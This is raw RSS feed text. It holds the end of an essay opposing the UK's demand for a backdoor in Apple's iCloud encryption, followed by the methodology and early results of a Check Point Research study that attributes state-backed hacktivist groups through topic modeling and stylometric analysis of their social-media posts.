&lt;p&gt;It seems unlikely that the UK is not coordinating its actions with the other &amp;#8220;Five Eyes&amp;#8221; countries of the United States, Canada, Australia, and New Zealand: the rich English-language-speaking spying club. Australia passed a &lt;a href="https://www.homeaffairs.gov.au/about-us/our-portfolios/national-security/lawful-access-telecommunications/assistance-and-access-industry-assistance-framework"&gt;similar law&lt;/a&gt; in 2018, giving it authority to demand that companies weaken their security features. As far as we know, it has never been used to force a company to re-engineer its security&amp;#8212;but since the law allows for a gag order we might never know. The UK law has a gag order as well; we only know about the Apple action because a whistleblower &lt;a href="http://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"&gt;leaked it&lt;/a&gt; to the &lt;em&gt;Washington Post&lt;/em&gt;. For all we know, they may have demanded this of other companies as well. In the United States, the FBI has &lt;a href="https://www.fbi.gov/news/speeches/going-dark-are-technology-privacy-and-public-safety-on-a-collision-course"&gt;long advocated&lt;/a&gt; for the same powers. Having the UK make this demand now, when the world is distracted by the foreign-policy turmoil of the Trump administration, might be what it&amp;#8217;s been waiting for.&lt;/p&gt;
&lt;p&gt;The companies need to resist, and&amp;#8212;more importantly&amp;#8212;we need to demand they do. The UK government, like the Australians and the FBI in years past, argues that this type of access is necessary for law enforcement&amp;#8212;that it is &amp;#8220;&lt;a href="https://www.fbi.gov/news/speeches/going-dark-are-technology-privacy-and-public-safety-on-a-collision-course"&gt;going dark&lt;/a&gt;&amp;#8221; and that the internet is a lawless place. We&amp;#8217;ve heard this kind of talk since the &lt;a href="https://archive.epic.org/crypto/legislation/freeh_797.html"&gt;1990s&lt;/a&gt;, but its scant evidence doesn&amp;#8217;t hold water. Decades of court cases with electronic evidence show again and again the police collect evidence through a variety of means, most of them&amp;#8212;like traffic analysis or informants&amp;#8212;having nothing to do with encrypted data. What police departments need are better computer investigative and forensics capabilities, not backdoors.&lt;/p&gt;
&lt;p&gt;We can &lt;a href="https://blog.cryptographyengineering.com/2025/02/12/u-k-asks-to-backdoor-icloud-backup-encryption/"&gt;all help&lt;/a&gt;. If you&amp;#8217;re an iCloud user, consider &lt;a href="https://support.apple.com/en-us/108756"&gt;turning this feature on&lt;/a&gt;. The more of us who use it, the harder it is for Apple to turn it off for those who need it to stay out of jail. This also puts pressure on other companies to offer similar security. And it helps those who need it to survive, because enabling the feature couldn&amp;#8217;t be used as a de facto admission of guilt. (This is a benefit of using WhatsApp over Signal. Since so many people in the world use WhatsApp, having it on your phone isn&amp;#8217;t in itself suspicious.)&lt;/p&gt;
&lt;p&gt;On the policy front, we have two choices. &lt;a href="https://www.schneier.com/wp-content/uploads/2016/02/paper-key-escrow.pdf"&gt;We&lt;/a&gt; &lt;a href="https://www.schneier.com/wp-content/uploads/2016/02/paper-keys-under-doormats.pdf"&gt;can&amp;#8217;t&lt;/a&gt; &lt;a href="https://www.schneier.com/wp-content/uploads/2024/01/Bugs_in_Our_Pockets.pdf"&gt;build&lt;/a&gt; security systems that work for some people and not others. We can either make our communications and devices as secure as possible against everyone who wants access, including foreign intelligence agencies and our own law enforcement, which protects everyone, including (unfortunately) criminals. Or we can weaken security&amp;#8212;the criminals&amp;#8217; as well as everyone else&amp;#8217;s.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s a question of &lt;a href="https://carnegieendowment.org/research/2019/09/moving-the-encryption-policy-conversation-forward?lang=en"&gt;security vs. security&lt;/a&gt;. Yes, we are all more secure if the police are able to investigate and solve crimes. But we are also more secure if our data and communications are safe from eavesdropping. A backdoor in Apple&amp;#8217;s security is not just harmful on a personal level, it&amp;#8217;s harmful to &lt;a href="https://www.thirdway.org/report/weakened-encryption-the-threat-to-americas-national-security"&gt;national security&lt;/a&gt;. We live in a world where everyone communicates electronically and stores their important data on a computer. These computers and phones are used by every national leader, member of a legislature, police officer, judge, CEO, journalist, dissident, political operative, and citizen. They need to be as secure as possible: from account takeovers, from ransomware, from foreign spying and manipulation. Remember that the FBI &lt;a href="https://www.nbcnews.com/tech/security/us-officials-urge-americans-use-encrypted-apps-cyberattack-rcna182694"&gt;recommended&lt;/a&gt; that we all use backdoor-free end-to-end encryption for messaging just a few months ago.&lt;/p&gt;
&lt;p&gt;Securing digital systems is hard. Defenders must defeat every attack, while eavesdroppers need one attack that works. Given how essential these devices are, we need to adopt a &lt;a href="https://www.atlanticcouncil.org/wp-content/uploads/2015/08/AC_StrategyPapers_No8_Saving_Cyberspace_WEB.pdf"&gt;defense-dominant strategy&lt;/a&gt;. To do anything else makes us all less safe.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/modern-approach-to-attributing-hacktivist-groups/"&gt;Modern Approach to Attributing Hacktivist Groups&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Itay Cohen (&lt;a href="https://x.com/megabeets_"&gt;@megabeets_&lt;/a&gt;)&lt;/p&gt;



&lt;p&gt;Over the past few decades, hacktivism has been, in a lot of cases, characterized by minor website defacements and distributed denial-of-service (DDoS) attacks, which, while making headlines, had minimal lasting impact. However, in recent years, we have observed a significant shift in the nature of these activities. Groups that appear to be state-sponsored, yet masquerade as hacktivists, are now conducting large-scale cyber and influence operations. These actors often use various group names and grassroots facades to maintain anonymity and reduce international backlash. These sophisticated attacks serve as powerful tools for political and social influence, providing plausible deniability and the illusion of legitimacy, thereby evading direct government attribution.&lt;/p&gt;



&lt;p&gt;This research explores whether such operations&amp;#8217; growing popularity and wide and repeating adoption might also be their Achilles&amp;#8217; heel. &lt;strong&gt;We introduce a new approach to attributing hacktivist groups by employing language-based machine-learning models and linguistic analysis.&lt;/strong&gt; Our study examines thousands of public messages from dozens of hacktivist groups, integrating traditional cyber threat intelligence methods with modern machine learning technologies. &lt;strong&gt;This combined approach aims to uncover the key topics discussed by these groups, understand their motivations over time, tie some of these groups together, and improve the way we do attribution when it comes to hacktivism.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Hacktivism, a blend of hacking and activism, has evolved dramatically since its inception. Emerging in the 1980s with groups like the Cult of the Dead Cow, which pioneered the concept of hacktivism, the phenomenon has grown from a fringe subculture into a significant force in global cyber politics. Early hacktivists targeted symbolic institutions and networks, aiming to draw attention to various social and political issues. The 1990s and 2000s saw the rise of more organized groups like Anonymous, whose operations, from the&amp;nbsp;&lt;a href="https://www.theguardian.com/technology/2008/feb/04/news"&gt;&lt;u&gt;2008 Scientology attacks&lt;/u&gt;&lt;/a&gt;&amp;nbsp;to the&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Operation_Payback"&gt;&lt;u&gt;2010 PayPal protests&lt;/u&gt;&lt;/a&gt;, showcased the potential of digital activism. Today, hacktivism is not just about defacing websites or DDoS attacks—it has become a sophisticated tool in the arsenal of state and non-state actors alike, influencing geopolitical landscapes worldwide.&lt;/p&gt;



&lt;p&gt;One of the most significant developments in hacktivism in recent years is the involvement of nation-state actors. Governments have recognized the strategic value of hacktivist methods, adopting and adapting them for their own purposes. Nations employ cyber operatives to conduct operations that mimic grassroots hacktivism. These activities often aim to sow discord, influence public opinion, or undermine political adversaries while maintaining plausible deniability. By cloaking their actions in the guise of independent hacktivism, governments can achieve their goals without direct attribution, complicating international responses and accountability.&lt;/p&gt;



&lt;p&gt;State-sponsored entities often stage operations to appear as though they are the work of independent hacktivists, thereby muddling the waters of attribution. They often operate multiple, sometimes dozens, of groups that appear to act independently. This strategy not only serves to mislead targets but also to discredit genuine activist movements by associating them with state agendas. Such deceptive tactics complicate the global cyber landscape, making it challenging to distinguish between actual hacktivist actions and state-sponsored subterfuge.&lt;/p&gt;



&lt;p&gt;In recent years, ever since this shift in the hacktivism landscape started, Check Point Research has been tracking dozens of hacktivism groups — some are operated by groups of hackers with mutual ideology or interest, and others by nation-state actors masquerade as hacktivists. Our investigations have led to several published articles detailing&amp;nbsp;&lt;a href="https://research.checkpoint.com/2022/the-new-era-of-hacktivism/"&gt;&lt;u&gt;significant operations&lt;/u&gt;&lt;/a&gt;&amp;nbsp;we believe were conducted by these state actors. In some cases, we have successfully&amp;nbsp;&lt;a href="https://research.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iran/"&gt;&lt;u&gt;linked&lt;/u&gt;&lt;/a&gt;&amp;nbsp;different hacktivist groups to a single operator, piercing their veil of anonymity. Our research has employed traditional threat intelligence and investigative methods, such as binary analysis, code similarity, and the Diamond Model of Intrusion Analysis. For instance, we demonstrated how one hacktivist group used the same unique tools and methods as another group targeting different entities years earlier, suggesting they were the same group. However, since then, nation-state hacktivist groups have refined their techniques, trying even harder to obscure their tracks and act independently.&lt;/p&gt;



&lt;p&gt;Tracking these groups has provided us with valuable insights into their motives, attack tactics, and usual targets. Our researchers have developed various theories and hypotheses regarding the operators behind these groups, suspecting that many are run, either directly or indirectly, by the intelligence agencies of different nation-states. The recent major geopolitical events, such as the Russian invasion of Ukraine and the conflict between Israel and Hamas, have highlighted shifts that would have otherwise gone unnoticed. In response to these events, hacking groups that had been inactive for years suddenly resurfaced, often with new focus areas. Independent groups began to echo similar messages, sometimes even referencing one another. These conflicts created a fertile ground for the emergence of new groups and cyber personas at an astonishing pace.&lt;/p&gt;



&lt;p&gt;The increased frequency of hacktivist operations and the rise of new groups have added complexity to the cyber threat landscape. The rapid formation and dissolution of these groups, coupled with their ability to adapt quickly to geopolitical changes, make it challenging for threat researchers to manually keep track of them. Recognizing that relying on gut feeling and intuition is not a solid approach to threat intelligence, we decided to explore more reliable, robust, and consistent methods.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="methodology"&gt;Methodology&lt;/h3&gt;



&lt;p&gt;In order to address our research questions and tackle the complexities we presented, we adopted a combined approach utilizing Topic Modeling and Stylometric analysis. This decision was driven by the need for better methods to analyze the vast amount of textual data written by hacktivist groups. By integrating language-based machine learning models and linguistic analysis, we aim to systematically uncover the motivations behind hacktivist activities, identify connections between different groups, and enhance the attribution of these operations to specific actors.&lt;/p&gt;



&lt;p&gt;Topic Modeling helps us understand the key themes and topics discussed by these groups over time. It allows us to answer questions such as: What are the main goals and targets of these hacktivist groups? How do their focus areas change in response to geopolitical events? By analyzing the content of the groups’ social media messages, we can identify clusters of topics and track their evolution, providing insights into the strategic objectives of these actors.&lt;/p&gt;



&lt;p&gt;Stylometric analysis, on the other hand, focuses on the unique writing styles of different groups. By examining features like word choice, sentence structure, and other linguistic patterns, we can answer questions such as: Can we tie different hacktivist groups together based on their writing style? Are there groups with similar textual fingerprints that might indicate common authorship or collaboration? This analysis helps us build a network of connections between different groups, offering a deeper understanding of their relationships and potentially revealing the operators behind these cyber personas.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="data-collection"&gt;Data Collection&lt;/h3&gt;



&lt;p&gt;To conduct this research, we collected data from the social media accounts and messages of hacktivist groups believed to be operated by nation-state actors. The primary sources of data were Twitter and Telegram, as these platforms are commonly used by hacktivist groups to disseminate their messages. The collection process involved several steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Identification of Target Accounts&lt;/strong&gt;: Although there are hundreds of social media accounts associated with cyber-personas of hacktivist groups, many of these accounts are either inactive or not backed by nation-state actors. We chose 35 hacktivist accounts that are active and potentially state-sponsored. These accounts were selected based on their activity, the nature of their messages, and previous reports linking them to nation-state actors. They represent a diverse range of targets and objectives, posting in languages such as English, Russian, Ukrainian, Persian, Hebrew, Hindi, and more. Some of these accounts are active on both Telegram and Twitter, often managing multiple accounts, including backup accounts. For each group, we noted all directly associated accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Extraction:&lt;/strong&gt;&amp;nbsp;To gather all messages from X, we utilized the official API to retrieve tweets and replies from these accounts. Although retweets might also indicate the topics of interest to these accounts, we chose not to include them due to their lower reliability compared to original tweets and replies. For Telegram, we used the Telegram Desktop application to export all messages published by channels operated by these hacktivist groups. In total, we collected approximately 20,000 tweets and messages from these accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Cleaning&lt;/strong&gt;: The raw data extracted from social media platforms included various elements such as URLs, hashtags, emojis, and special characters. For the topic modeling algorithm, we cleaned the data by removing these elements to focus on the textual content. Additionally, non-English messages were translated into English to maintain consistency. However, for the stylometric analysis, we retained these elements. Since our stylometric models support multiple languages, we preserved the original language and did not translate these messages.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Data Storage:&lt;/strong&gt;&amp;nbsp;The cleaned data was stored in a structured format, making it suitable for further analysis. Each message was tagged with metadata, including the date of publication, the originating account, and the code of the original language.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Having all the data structured and ready for analysis we moved on to the analysis.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="topic-modeling"&gt;Topic Modeling&lt;/h3&gt;



&lt;p&gt;Topic modeling is a machine-learning technique used to identify themes (topics) within large collections of textual data. In this research, we employed&amp;nbsp;&lt;a href="https://maartengr.github.io/BERTopic/"&gt;&lt;u&gt;BERTopic&lt;/u&gt;&lt;/a&gt;, a modular and flexible framework for topic modeling. The process involved the following steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Embedding Documents&lt;/strong&gt;: The first step is to convert our textual data into numerical representations, which can be processed by machine learning algorithms. Using BERTopic, we use sentence-transformer models optimized for semantic similarity tasks. These models are adept at creating document embeddings that capture the semantic nuances of the text, making them ideal for our clustering tasks. In simpler terms, we transform the text into numbers that reflect their meanings, allowing us to find patterns and similarities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Dimensionality Reduction&lt;/strong&gt;: High-dimensional data can be challenging for clustering algorithms, so we used&amp;nbsp;&lt;a href="https://umap-learn.readthedocs.io/en/latest/index.html"&gt;&lt;u&gt;UMAP&lt;/u&gt;&lt;/a&gt;&amp;nbsp;(Uniform Manifold Approximation and Projection) to reduce the dimensionality of the embeddings while preserving their essential structure. This step ensures that the clustering process can effectively group semantically similar messages, maintaining both local and global relationships within the data. Essentially, we simplify the data while keeping its important relationships intact, making it easier to analyze.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clustering Documents&lt;/strong&gt;: With reduced-dimensionality embeddings, we applied&amp;nbsp;&lt;a href="https://scikit-learn.org/stable/modules/generated/sklearn.cluster.AgglomerativeClustering.html"&gt;&lt;u&gt;Agglomerative Clustering&lt;/u&gt;&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://scikit-learn.org/stable/modules/generated/sklearn.cluster.HDBSCAN.html"&gt;&lt;u&gt;HDBSCAN&lt;/u&gt;&lt;/a&gt;&amp;nbsp;(Hierarchical Density-Based Spatial Clustering of Applications with Noise) to identify clusters within the data. HDBSCAN is particularly suited to our needs because it can find clusters of varying shapes and densities while identifying outliers. This feature helps in improving the quality of the resulting topic representations by reducing noise. In other words, we group similar messages together while filtering out irrelevant ones.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Bag-of-Words Representation&lt;/strong&gt;: To create meaningful topic representations, we combined all documents within each cluster into a single document and counted the frequency of each word. This process, known as the bag-of-words representation, helps in identifying the most significant words within each cluster without making assumptions about the cluster structure. Simply put, we focus on the most common words in each group to understand what each topic is about.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Topic Representation&lt;/strong&gt;: We then used a modified version of the traditional TF-IDF (Term Frequency-Inverse Document Frequency) approach to work at the cluster level rather than the document level. This modification, called class-based TF-IDF (&lt;a href="https://towardsdatascience.com/creating-a-class-based-tf-idf-with-scikit-learn-caea7b15b858"&gt;&lt;u&gt;c-TF-IDF&lt;/u&gt;&lt;/a&gt;), calculates the importance of words within each bag of words by comparing their frequency within the cluster to their frequency across all clusters. This method allows us to extract the most representative words for each topic, providing clear and meaningful topic descriptions. In essence, we determine the key words that define each topic by comparing their importance within and across groups.&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;# Docs&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Representation&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Documents&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 1&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;2775&lt;/th&gt;&lt;th&gt;attack &amp;#8211; russian &amp;#8211; cyber &amp;#8211; ukrainian &amp;#8211; hack&lt;/th&gt;&lt;th&gt;[“we announce for all&amp;nbsp;&lt;strong&gt;russian&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;hackers&lt;/strong&gt;, we begin the&amp;nbsp;&lt;strong&gt;cyber&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on&amp;nbsp;&lt;strong&gt;ukrainian&lt;/strong&gt;&amp;nbsp;websites …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 2&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;1205&lt;/th&gt;&lt;th&gt;israel &amp;#8211; cyber &amp;#8211; leak &amp;#8211; zionist &amp;#8211; gaza&lt;/th&gt;&lt;th&gt;[“#&lt;strong&gt;Israel&lt;/strong&gt;Leaks &amp;#8211; Day Four &amp;#8211;&amp;nbsp;&lt;strong&gt;Leak&lt;/strong&gt;&amp;nbsp;One &amp;#8211;&amp;nbsp;&lt;strong&gt;Israel&lt;/strong&gt;&amp;nbsp;Innovation Authority &amp;#8211; #Op&lt;strong&gt;Cyber&lt;/strong&gt;Toufan #Op&lt;strong&gt;Israel&lt;/strong&gt;, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 3&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;978&lt;/th&gt;&lt;th&gt;confidential &amp;#8211; letter &amp;#8211; leak &amp;#8211; regime &amp;#8211; iran&lt;/th&gt;&lt;th&gt;[“We&amp;nbsp;&lt;strong&gt;expose&lt;/strong&gt;&amp;nbsp;a very&amp;nbsp;&lt;strong&gt;confidential&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;letter&lt;/strong&gt;&amp;nbsp;from the cultural and social vice president, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 4&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;490&lt;/th&gt;&lt;th&gt;cyber &amp;#8211; operation &amp;#8211; russia &amp;#8211; slava &amp;#8211; ukraine&lt;/th&gt;&lt;th&gt;[“today we will cut the tongue of&amp;nbsp;&lt;strong&gt;russian&lt;/strong&gt;&amp;nbsp;propaganda and carry out an do&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on rt (tv &amp;#8220;&lt;strong&gt;russia&lt;/strong&gt;&amp;nbsp;today&amp;#8221;) …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;…&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic N&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;33&lt;/th&gt;&lt;th&gt;italy &amp;#8211; european &amp;#8211; attack &amp;#8211; farmers &amp;#8211; cyber&lt;/th&gt;&lt;th&gt;[“and we continue our joint&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on&amp;nbsp;&lt;strong&gt;italy&lt;/strong&gt;&amp;nbsp;and with the help of our friends from, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic -1&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;283&lt;/th&gt;&lt;th&gt;&lt;strong&gt;NaN&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;[“because you are a dwarf or a small child, you certainly do not know him”, …]&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol class="wp-block-list" start="6"&gt;
&lt;li&gt;&lt;strong&gt;Fine-tuning Topic Representation&lt;/strong&gt;: To further refine the topic representations, we split, merged, and dropped some topics. This step ensures that the final set of topics is both comprehensive and precise.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Assigning Topic Names Using LLMs&lt;/strong&gt;: To give the topics proper names, we used Large Language Models (LLMs), specifically&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Generative_pre-trained_transformer"&gt;&lt;u&gt;GPT&lt;/u&gt;&lt;/a&gt;. We provided the model with a list of keywords and representative documents for each topic and asked it to generate concise and descriptive labels for the topic. This step helps us understand what each topic is about at a glance.&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31054" height="452" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image1.png" width="992" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;2&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;The topic-modeling process step by step. BERTopic is modular and flexible.&lt;/p&gt;



&lt;ol class="wp-block-list" start="8"&gt;
&lt;li&gt;&lt;strong&gt;Visualizing Topics:&lt;/strong&gt;&amp;nbsp;We visualized the distribution of topics across different hacktivist accounts and the prevalence of each topic within the accounts. This involved creating charts that show which accounts are discussing each topic and the proportion of messages each account dedicates to different topics. Visualizing topics in this manner helps us identify which groups are focused on particular themes and how their interests align or diverge. For instance, we can see if multiple groups are simultaneously discussing a significant geopolitical event. These visualizations also allow us to track changes in focus over time, providing insights into how hacktivist strategies evolve in response to global events.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;By employing topic modeling, we can inspect the topics and themes within vast amounts of textual data — the messages written by the different profiles. It allows us to gain insights into the key topics and trends discussed by these hacktivist groups, track changes in their focus areas over time, and understand their strategic objectives. For example, we can identify how the focus of certain groups shifts in response to geopolitical events, such as an uptick in messages related to cyber attacks following a major conflict. Additionally, topic modeling can reveal unexpected connections between groups discussing similar topics, suggesting potential coordination or shared motivations. Since these groups were most likely created by intelligence agencies, understanding the topics discussed by each of them can help us understand what mission or goal these accounts are serving and what purpose they were created for. Visualizing the topics over time allows us to detect shifts in focus or interest by the entities operating these accounts. Combining these insights together, we can have a better understanding of who might be behind these groups, based on the interest and the change of interest of certain groups.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="stylometry"&gt;Stylometry&lt;/h3&gt;



&lt;p&gt;Stylometry is the study of linguistic style, often used for authorship attribution. It leverages the unique way individuals write, akin to a linguistic fingerprint, to identify authors or establish connections between texts. In this research, we utilized stylometric analysis to compare the writing styles of different hacktivist groups. This method provided us with potential relationships and commonalities between these groups. The process involved the following steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Feature Extraction:&lt;/strong&gt;&amp;nbsp;We used the&amp;nbsp;&lt;a href="https://github.com/ZILiAT-NASK/StyloMetrix"&gt;&lt;u&gt;StyloMetrix&lt;/u&gt;&lt;/a&gt;&amp;nbsp;framework to extract nearly 200 features from the collected messages. StyloMetrix is a tool for creating text representations as vectors. Each metric in the vector quantifies a linguistic feature in the text. These features included:
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Lexical Features:&lt;/strong&gt;&amp;nbsp;These involve word choice, punctuation, vocabulary richness, and the frequency of specific words or phrases. For instance, how often certain words appear.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Syntactic Features:&lt;/strong&gt;&amp;nbsp;These include sentence structure, punctuation use, and sentence length. We looked at how often sentences start with capital letters, the average sentence length, and the use of various punctuation marks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Stylistic Elements:&lt;/strong&gt;&amp;nbsp;This covers the use of emojis, hashtags, and special characters. For example, some groups might consistently use certain emojis or have a specific way of formatting their messages.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Functional Words:&lt;/strong&gt;&amp;nbsp;These are common words like prepositions, conjunctions, and pronouns, which often unconsciously reflect the author&amp;#8217;s style.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Aggregation:&lt;/strong&gt;&amp;nbsp;The extracted features were aggregated to create a unique stylistic fingerprint for each hacktivist account. This involved summarizing the feature values across all messages from each account. By doing this, we developed a profile for each group that encapsulates their unique writing style.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Comparison:&lt;/strong&gt;&amp;nbsp;We used similarity measures to compare the stylistic fingerprints of different accounts. This analysis helped us identify accounts with similar writing styles, suggesting potential connections between them. For example, if two groups frequently use similar phrases, punctuation, or even unique emojis, it might indicate a shared author.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Visualization:&lt;/strong&gt;&amp;nbsp;The results of the stylometric analysis were visualized using network graphs. These graphs highlighted the connections between different hacktivist groups based on their writing styles, highlighting potential common authors or coordinated efforts. For instance, a dense cluster in the graph might suggest a single entity operating multiple accounts, while isolated nodes indicate independent operators.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Stylometry can reveal a wealth of information beyond mere authorship. For instance:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Attribution:&lt;/strong&gt;&amp;nbsp;By comparing the writing styles of various groups, we can attribute specific messages to known hacktivist entities or even uncover previously unknown affiliations. Often, as mentioned above, new groups are created. Stylometric analysis of the messages of the new group can help us understand whether it is a rebranding of a previously known group.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Evolution of Writing Style:&lt;/strong&gt;&amp;nbsp;Analyzing how the writing style of a single account evolves over time can provide clues about changes in the group&amp;#8217;s membership or operational strategy. It can help us observe whether a group operated by a single author, started having additional authors, and even spot if they are taking shifts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Detecting Deception:&lt;/strong&gt;&amp;nbsp;If an account suddenly changes its writing style, it might indicate that the account has been taken over by a different entity or that the original authors are trying to disguise their identity.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By identifying stylistic consistencies across different messages and accounts, we can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Link seemingly unrelated hacktivist groups:&lt;/strong&gt;&amp;nbsp;Discover connections that are not immediately apparent through traditional analysis.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enhance the accuracy of attribution:&lt;/strong&gt;&amp;nbsp;Provide additional evidence to support the identification of state-sponsored actors behind certain groups.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Uncover coordinated campaigns:&lt;/strong&gt;&amp;nbsp;Detect patterns that suggest a larger, organized effort rather than isolated incidents.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By using stylometric analysis in our methodology, we were able to gain a deeper understanding of the relationships and behaviors of hacktivist groups. This approach provided a layer of analysis that complements traditional methods, offering a more nuanced view of these groups.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="results"&gt;Results&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="topic-modeling-analysis"&gt;Topic Modeling Analysis&lt;/h3&gt;



&lt;p&gt;In our analysis, we utilized the BERTopic framework to identify and categorize the main themes discussed by various hacktivist groups. After clustering the messages, we extracted the most representative words for each cluster using the class-based TF-IDF (c-TF-IDF) method. We used GPT to assign meaningful names to these topics, which provided concise and descriptive labels based on the top keywords and representative documents for each cluster. Some initial topics were too specific or too broad, requiring refinement. For instance, smaller topics related to leaking documents from the Ukrainian Army were merged into the broader &amp;#8220;Leaking Documents from Ukrainian organizations&amp;#8221; topic, while the general topic of &amp;#8220;Cyber Attacks in Europe&amp;#8221; was split into more specific topics like &amp;#8220;Cyber Attacks Against Spain&amp;#8221; and &amp;#8220;Cyber Attacks Against UK.&amp;#8221; This iterative process ensured that the final set of topics was both comprehensive and precise. Eventually, we ended up with a set of topics that represented the main interests of these groups.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31058" height="376" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image5-1024x376.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;:&amp;nbsp;Topic modeling visualization of users-per-topic&lt;/p&gt;



&lt;p&gt;There were multiple topics discussing cyber attacks against organizations in different countries such as Israel, Ukraine, Russia, Iran, India, Spain, the USA, and more. Others focused on cyber attacks against militant organizations such as Hezbollah in Lebanon and the Huthis in Yemen. Some topics were related to the leaking of sensitive information from countries such as Ukraine, Israel, Russia, and Iran. Many topics were directly linked to major geopolitical events, such as the Russian invasion of Ukraine and the Israel-Hamas conflict. This highlights the role of hacktivist groups in cyber warfare and propaganda. On some occasions, similar topics discussed by different groups suggest possible coordination or shared objectives.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
